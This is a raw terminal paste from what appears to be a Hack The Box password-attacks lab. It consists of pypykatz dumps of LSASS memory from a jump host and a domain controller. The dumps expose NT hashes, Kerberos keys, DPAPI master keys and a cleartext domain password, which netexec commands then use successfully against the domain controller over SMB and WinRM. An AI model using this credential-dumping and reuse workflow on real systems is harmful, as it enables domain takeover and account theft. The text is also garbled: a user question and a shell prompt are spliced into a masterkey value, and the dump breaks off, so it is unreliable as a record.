                AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
        == WDIGEST [9abb]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 38716 (973c)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-09-08T07:15:38.828457+00:00
sid None
luid 38716
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 619932 (9759c)
session_id 0
username bdavid
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T07:21:55.958082+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1105
luid 619932

== LogonSession ==
authentication_id 555895 (87b77)
session_id 0
username bdavid
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T07:20:54.129946+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1105
luid 555895

== LogonSession ==
authentication_id 267189 (413b5)
session_id 2
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T07:16:25.919018+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 267189
        == MSV ==
                Username: stom
                Domain: NEXURA
                LM: NA
                NT: 21ea958524cfd9a7791737f8d2f764fa
                SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
                DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
        == WDIGEST [413b5]==
                username stom
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: stom
                Domain: NEXURA.HTB
                AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
                AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
        == WDIGEST [413b5]==
                username stom
                domainname NEXURA
                password None
                password (hex)
        == DPAPI [413b5]==
                luid 267189
                key_guid 33fbd25b-2488-49ef-9fa2-7a96959acb95
                masterkey 0528dd7d0cfa8ca48e12bf937ab2dcd92fa588f958716a9abc6fa49444b9d580a0ab3d8f7657e4a4d327fe7df824c112ec8a3d04c22f8050e669c8f256983cda
                sha1_masterkey 1cf754450d3c0515af105fd64ef952f9486495fb

== LogonSession ==
authentication_id 267115 (4136b)
session_id 2
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T07:16:25.919018+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 267115
        == MSV ==
                Username: stom
                Domain: NEXURA
                LM: NA
                NT: 21ea958524cfd9a7791737f8d2f764fa
                SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
                DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
        == WDIGEST [4136b]==
                username stom
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: stom
                Domain: NEXURA.HTB
                AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
                AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
        == WDIGEST [4136b]==
                username stom
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 246780 (3c3fc)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-09-08T07:16:25.212710+00:00
sid S-1-5-90-0-2
luid 246780
        == MSV ==
                Username: JUMP01$
                Domain: NEXURA
                LM: NA
                NT: 7bef0ee0b472d2c5805921324525f321
                SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [3c3fc]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: JUMP01$
                Domain: nexura.htb
                Password: 333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                password (hex)333f478788ef02f9db68be04ae0c7a447a3e6534e6e012cc1edc04497ec66014630dbcaa9721d6a6217b00032890d98d52dc222a4bbc661fd5b71ffcf383a1af870724769b22800f0f03a402a9b5379c24166f63ac32b933811e57e029921067d81bcc6581b7ed924d66bd4cd6371a8b55abd571979cd500b23cb83d76d5e24241e953872ee69bf0172f57e85858d1f46626501e6fac76ef4cf71e1635c28124a5f6ac2f702a68e17836ab52d70d47f3d4dc3008c6fc7646c008128f66bd3b6e717933302039845feec4677add12b6edadd935ea406d051e0e49f18c83e9600b24d68c7de30399357c10918b7b3c4756
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: ff3bf7975dbcbe960805376e92c0a68e98071d51d007077a8f74297ebe6c9389
        == WDIGEST [3c3fc]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 223580 (3695c)
session_id 0
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T07:16:11.078463+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 223580
        == MSV ==
                Username: stom
                Domain: NEXURA
                LM: NA
                NT: 21ea958524cfd9a7791737f8d2f764fa
                SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
                DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
        == WDIGEST [3695c]==
                username stom
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: stom
                Domain: NEXURA.HTB
                Password: calves-warp-learning1
                password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
                AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
                AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
        == WDIGEST [3695c]==
                username stom
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-09-08T07:15:39.906577+00:00
sid S-1-5-19
luid 997
        == Kerberos ==
                Username: 
                Domain: 

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username JUMP01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:15:38.672202+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: jump01$
                Domain: NEXURA.HTB
                AES128 Key: 7bef0ee0b472d2c5805921324525f321
                AES256 Key: 9521aa66829ccb2e8263c0fd7ac25e909bba456a1474ecac6676ace5ce7a812b
        == WDIGEST [3e7]==
                username JUMP01$
                domainname NEXURA
                password None
                password (hex)
        == DPAPI [3e7]==
                luid 999
                key_guid 6f898230-c272-4f85-875c-9f7b354ce485
                masterkey 515312a4b821ede8f2d839db59ca683d55f8a3a22568d80639e2dd4f6986a4b5dc8ec78bdd54aa643c3856fbb2602301c05f37c763bce3dca8addd70b9709018
                sha1_masterkey a72bb2f3d888269936f60a4deb2ea5fc9382ddfc
        == DPAPI [3e7]==
                luid 999
                key_guid af749248-2974-41a6-b1f2-baa5c380dd06
                masterkey 60aa204eb366f752175f42421034b0731404451fd325dad4ad1ca87a04be0c153004438b323752fbc2c6aa6a837ac91b54231341f50824c11b7ca68fed0f65ea
                sha1_masterkey bca3f26011191733581e044adafe61718945c513
        == DPAPI [3e7]==
                luid 999
                key_guid 60dddcd7-ae2a-4d56-9015-8c9610d22f1c
                masterkey 559fac54ce814e726cfc905112283d3dd9b6952573553fccba02fb183fb1df4c3ea9d42f1ed8d82b59a38600c1c16bc620795c2f9d99e3d7d97cd748f00a84e2
                sha1_masterkey c924316a1562430664979e3b0f6b35cfac1df0c1
        == DPAPI [3e7]==
                luid 999
                key_guid a3e4e62a-dabd-46af-ad98-19e980bfcacc
                masterkey bf2d5ec8e50a7a1f39a95b285b89c34801f9fc20e4de040be484dd9e9e0da541103d9d52a4262cca2c56c42d6a6623a4c3688d11eead456d29ba4232b1d56ad6
                sha1_masterkey deafb3b197371274c7968d7fd84264210e124102
        == DPAPI [3e7]==
                luid 999
                key_guid a81a2dcc-bfc1-4647-b0a7-abb508a6e7df
                masterkey 0de9f713c2a2c3490faf703ceb57c458020429170615bca60b87519ce8eb5711732d444211b71e80aa9ac379ef6ba0aea33c3a6ebd92860cb6b20ff1bc9a0ac7
                sha1_masterkey 59cee312e149c59e836474079479757ac7e3842c
        == DPAPI [3e7]==
                luid 999
                key_guid 9ccbb5e8-66c9-4210-a46c-a72e8f750734
                masterkey cb6dd3fe4b3f3a6afa0520d84b39539205139ebd81b68c49aef5c365d975920331c43fb06990aa3ef8c07860fdda33100d3b4cdf259d02cc02a3114ecf6e7721
                sha1_masterkey a0c3d07ffb66b9d1d3a9e02237d56fde0fc217d1

```

```
nxc smb 172.16.119.11 -u 'stom' -p 'calves-warp-learning1' -d nexura.htb
SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:calves-warp-learning1 (Pwn3d!)                                                                                          
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
└─$ nxc winrm 172.16.119.11 -u 'stom' -p 'calves-warp-learning1' -d nexura.htb
WINRM       172.16.119.11   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) 
WINRM       172.16.119.11   5985   DC01             [+] nexura.htb\stom:calves-warp-learning1 (Pwn3d!)                                                                                          
```

```
 pypykatz lsa minidump /home/satoru/Desktop/HTB/CPTS/skills/password_attacks/lsass.dmp
INFO:pypykatz:Parsing file /home/satoru/Desktop/HTB/CPTS/skills/password_attacks/lsass.dmp
FILE: ======== /home/satoru/Desktop/HTB/CPTS/skills/password_attacks/lsass.dmp =======
== LogonSession ==
authentication_id 1294639 (13c12f)
session_id 0
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T08:03:22.406003+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 1294639

== LogonSession ==
authentication_id 1238113 (12e461)
session_id 0
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T07:59:14.499758+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 1238113

== LogonSession ==
authentication_id 765476 (bae24)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:30:36.249751+00:00
sid S-1-5-18
luid 765476
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 347515 (54d7b)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:20:58.156007+00:00
sid S-1-5-18
luid 347515
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 233251 (38f23)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:16:06.499748+00:00
sid S-1-5-18
luid 233251
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:15:26.468502+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: e693ad3d3ef71e452a1c7c1e3129d01b
                SHA1: 2e645c50cc6714f32b331654bc447193f5e19232
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [3e4]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: dc01$
                Domain: nexura.htb
                Password: 330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                password (hex)330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                AES128 Key: e693ad3d3ef71e452a1c7c1e3129d01b
                AES256 Key: 4d67d45d2655a2b2739111352e706d01d5784b18375ac68e46570531d9169d9e
        == WDIGEST [3e4]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 41466 (a1fa)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-09-08T07:15:26.312250+00:00
sid S-1-5-96-0-0
luid 41466
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: 9d80cee28b2e985285a43a7c4eb3122c
                SHA1: f5d263dfc08c088d4530a4eb13ffd0c2ff12b85e
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [a1fa]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: nexura.htb
                Password: 4dad8192d4af8c2e49647ff74ae15c48fb75c74bf9d4160fe0ae9f543e3208bf7570a58a32a2c4bbd70810784b63bd6a9c885418e991bc7ef46bbabebfe0e52ec50bc3c862b34fa4e2ff09532159dc8d901bf082688f0cd50ae3e7b6e3fa7c9db8b6eba7e1ae6442609d7b282676d7407bda3a3c5e4eab0868385e83139f2be61eba1850bb50d8ac7de69bcb4e1037a637c3ab104cb5e859b4aa027fc0c26b6861c19380448d4256e45a2c107d62874107c77abe1c59f35eacb9e2c79548f84fa3ba5379ca9bf658cf328fd6d48a83e1d38e7e0288cbe218af130b103b84e91e82c38821e0c6a40394ae03e522580e9a
                password (hex)4dad8192d4af8c2e49647ff74ae15c48fb75c74bf9d4160fe0ae9f543e3208bf7570a58a32a2c4bbd70810784b63bd6a9c885418e991bc7ef46bbabebfe0e52ec50bc3c862b34fa4e2ff09532159dc8d901bf082688f0cd50ae3e7b6e3fa7c9db8b6eba7e1ae6442609d7b282676d7407bda3a3c5e4eab0868385e83139f2be61eba1850bb50d8ac7de69bcb4e1037a637c3ab104cb5e859b4aa027fc0c26b6861c19380448d4256e45a2c107d62874107c77abe1c59f35eacb9e2c79548f84fa3ba5379ca9bf658cf328fd6d48a83e1d38e7e0288cbe218af130b103b84e91e82c38821e0c6a40394ae03e522580e9a
                AES128 Key: 9d80cee28b2e985285a43a7c4eb3122c
                AES256 Key: 2ddb36150226934ef20a1e95940ace7fe7ec87e5df10f127bf25fed8c71652fb
        == WDIGEST [a1fa]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 41358 (a18e)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-09-08T07:15:26.296620+00:00
sid S-1-5-96-0-0
luid 41358
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: e693ad3d3ef71e452a1c7c1e3129d01b
                SHA1: 2e645c50cc6714f32b331654bc447193f5e19232
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [a18e]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: nexura.htb
                Password: 330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                password (hex)330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                AES128 Key: e693ad3d3ef71e452a1c7c1e3129d01b
                AES256 Key: 27960d41e51c420a5c44c30331f876a85ab0499f23d6f6ab35b4dbc857ac5787
        == WDIGEST [a18e]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 38559 (969f)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-09-08T07:15:24.109115+00:00
sid None
luid 38559
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: e693ad3d3ef71e452a1c7c1e3129d01b
                SHA1: 2e645c50cc6714f32b331654bc447193f5e19232
                DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 1248190 (130bbe)
session_id 0
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-09-08T07:59:53.327955+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 1248190

== LogonSession ==
authentication_id 722973 (b081d)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:25:58.655993+00:00
sid S-1-5-18
luid 722973
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 345590 (545f6)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:20:57.843510+00:00
sid S-1-5-18
luid 345590
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 345396 (54534)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:20:57.843510+00:00
sid S-1-5-18
luid 345396
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 232521 (38c49)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:16:06.359121+00:00
sid S-1-5-18
luid 232521
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 232394 (38bca)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:16:06.312259+00:00
sid S-1-5-18
luid 232394
        == Kerberos ==
                Username: DC01$
                Domain: NEXURA.HTB

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-09-08T07:15:26.952871+00:00
sid S-1-5-19
luid 997
        == Kerberos ==
                Username: 
                Domain: 

== LogonSession ==
authentication_id 69217 (10e61)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-09-08T07:15:26.765374+00:00
sid S-1-5-90-0-1
luid 69217
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: 9d80cee28b2e985285a43a7c4eb3122c
                SHA1: f5d263dfc08c088d4530a4eb13ffd0c2ff12b85e
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [10e61]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: nexura.htb
                Password: 4dad8192d4af8c2e49647ff74ae15c48fb75c74bf9d4160fe0ae9f543e3208bf7570a58a32a2c4bbd70810784b63bd6a9c885418e991bc7ef46bbabebfe0e52ec50bc3c862b34fa4e2ff09532159dc8d901bf082688f0cd50ae3e7b6e3fa7c9db8b6eba7e1ae6442609d7b282676d7407bda3a3c5e4eab0868385e83139f2be61eba1850bb50d8ac7de69bcb4e1037a637c3ab104cb5e859b4aa027fc0c26b6861c19380448d4256e45a2c107d62874107c77abe1c59f35eacb9e2c79548f84fa3ba5379ca9bf658cf328fd6d48a83e1d38e7e0288cbe218af130b103b84e91e82c38821e0c6a40394ae03e522580e9a
                password (hex)4dad8192d4af8c2e49647ff74ae15c48fb75c74bf9d4160fe0ae9f543e3208bf7570a58a32a2c4bbd70810784b63bd6a9c885418e991bc7ef46bbabebfe0e52ec50bc3c862b34fa4e2ff09532159dc8d901bf082688f0cd50ae3e7b6e3fa7c9db8b6eba7e1ae6442609d7b282676d7407bda3a3c5e4eab0868385e83139f2be61eba1850bb50d8ac7de69bcb4e1037a637c3ab104cb5e859b4aa027fc0c26b6861c19380448d4256e45a2c107d62874107c77abe1c59f35eacb9e2c79548f84fa3ba5379ca9bf658cf328fd6d48a83e1d38e7e0288cbe218af130b103b84e91e82c38821e0c6a40394ae03e522580e9a
                AES128 Key: 9d80cee28b2e985285a43a7c4eb3122c
                AES256 Key: 2ddb36150226934ef20a1e95940ace7fe7ec87e5df10f127bf25fed8c71652fb
        == WDIGEST [10e61]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 69199 (10e4f)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-09-08T07:15:26.765374+00:00
sid S-1-5-90-0-1
luid 69199
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: e693ad3d3ef71e452a1c7c1e3129d01b
                SHA1: 2e645c50cc6714f32b331654bc447193f5e19232
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [10e4f]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: nexura.htb
                Password: 330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                password (hex)330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                AES128 Key: e693ad3d3ef71e452a1c7c1e3129d01b
                AES256 Key: 27960d41e51c420a5c44c30331f876a85ab0499f23d6f6ab35b4dbc857ac5787
        == WDIGEST [10e4f]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 41391 (a1af)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-09-08T07:15:26.312250+00:00
sid S-1-5-96-0-1
luid 41391
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: 9d80cee28b2e985285a43a7c4eb3122c
                SHA1: f5d263dfc08c088d4530a4eb13ffd0c2ff12b85e
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [a1af]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: nexura.htb
                Password: 4dad8192d4af8c2e49647ff74ae15c48fb75c74bf9d4160fe0ae9f543e3208bf7570a58a32a2c4bbd70810784b63bd6a9c885418e991bc7ef46bbabebfe0e52ec50bc3c862b34fa4e2ff09532159dc8d901bf082688f0cd50ae3e7b6e3fa7c9db8b6eba7e1ae6442609d7b282676d7407bda3a3c5e4eab0868385e83139f2be61eba1850bb50d8ac7de69bcb4e1037a637c3ab104cb5e859b4aa027fc0c26b6861c19380448d4256e45a2c107d62874107c77abe1c59f35eacb9e2c79548f84fa3ba5379ca9bf658cf328fd6d48a83e1d38e7e0288cbe218af130b103b84e91e82c38821e0c6a40394ae03e522580e9a
                password (hex)4dad8192d4af8c2e49647ff74ae15c48fb75c74bf9d4160fe0ae9f543e3208bf7570a58a32a2c4bbd70810784b63bd6a9c885418e991bc7ef46bbabebfe0e52ec50bc3c862b34fa4e2ff09532159dc8d901bf082688f0cd50ae3e7b6e3fa7c9db8b6eba7e1ae6442609d7b282676d7407bda3a3c5e4eab0868385e83139f2be61eba1850bb50d8ac7de69bcb4e1037a637c3ab104cb5e859b4aa027fc0c26b6861c19380448d4256e45a2c107d62874107c77abe1c59f35eacb9e2c79548f84fa3ba5379ca9bf658cf328fd6d48a83e1d38e7e0288cbe218af130b103b84e91e82c38821e0c6a40394ae03e522580e9a
                AES128 Key: 9d80cee28b2e985285a43a7c4eb3122c
                AES256 Key: 2ddb36150226934ef20a1e95940ace7fe7ec87e5df10f127bf25fed8c71652fb
        == WDIGEST [a1af]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 41365 (a195)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-09-08T07:15:26.296620+00:00
sid S-1-5-96-0-1
luid 41365
        == MSV ==
                Username: DC01$
                Domain: NEXURA
                LM: NA
                NT: e693ad3d3ef71e452a1c7c1e3129d01b
                SHA1: 2e645c50cc6714f32b331654bc447193f5e19232
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [a195]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: nexura.htb
                Password: 330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                password (hex)330b0fb9126a6cf7663c34b6e0587f7819f4f448f412b410c7ebe1487dd80e1aec92b91ff2390bed347a939481709a9d25803a925a0aa3180904ae640b5de936227f21599f29a1eb60d186f3cb16b0241f0eec8360548b41b4fe49a5377946ebff70250cb8fdb68d8be69beeb181e8c75c5c1a2c3529c2642dfbf4993f01293ae4a4087408dab8583ef2234438aa00710e1d43f6f63a7891ad699e188ed399a6acb2d1154f100c90d542fb8b30a4c73bd217a5c018b5cc6e027b5f2357d41c7615708f27f7eeb323b6349679fe5bcbcb355971fbb53380e29811ca139a4fe8f0ca0ea07b1c43b1fa8e9b979adc76d641
                AES128 Key: e693ad3d3ef71e452a1c7c1e3129d01b
                AES256 Key: 27960d41e51c420a5c44c30331f876a85ab0499f23d6f6ab35b4dbc857ac5787
        == WDIGEST [a195]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname NEXURA
logon_server 
logon_time 2026-09-08T07:15:24.015368+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == Kerberos ==
                Username: dc01$
                Domain: NEXURA.HTB
                AES128 Key: e693ad3d3ef71e452a1c7c1e3129d01b
                AES256 Key: 4d67d45d2655a2b2739111352e706d01d5784b18375ac68e46570531d9169d9e
        == WDIGEST [3e7]==
                username DC01$
                domainname NEXURA
                password None
                password (hex)
        == DPAPI [3e7]==
                luid 999
                key_guid d4bfcc8b-5eec-485d-8adb-9ed4ae5656d6
                masterkey                            
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/password_attacks]
￼└─$ 
 is this the same dump eca925284a52906e2fd6cc17fc32eb00147ee9658930c82de6903034e2ba338fa259e096ced51569555490d1dc5903f1b2e9bbd87996b5e95c81b5c1bad0c28c
                sha1_masterkey 785e6d5a1dc4a77a4b963b4198b2b5754000a6ef
        == DPAPI [3e7]==
                luid 999
                key_guid 6f898230-c272-4f85-875c-9f7b354ce485
                masterkey 515312a4b821ede8f2d839db59ca683d55f8a3a22568d80639e2dd4f6986a4b5dc8ec78bdd54aa643c3856fbb2602301c05f37c763bce3dca8addd70b9709018
